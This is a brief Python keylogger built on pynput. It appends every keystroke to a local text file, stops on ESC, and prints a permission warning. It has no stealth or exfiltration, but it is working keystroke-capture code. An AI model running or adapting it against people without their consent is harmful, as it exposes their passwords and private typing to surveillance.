from pynput import keyboard

def on_press(key):
    try:
        # Open the log file in append mode
        with open("key_log.txt", "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                # Log printable characters
                log_file.write(key.char)
            else:
                # Log special keys in a readable format
                log_file.write(f' [{key.name}] ')
    except Exception as e:
        print(f"An error occurred while logging the key: {e}")

def on_release(key):
    # Stop listener when 'ESC' key is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    # Warning for ethical use
    print("** WARNING: Use this keylogger only with explicit permission and for legal purposes only. **")

    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
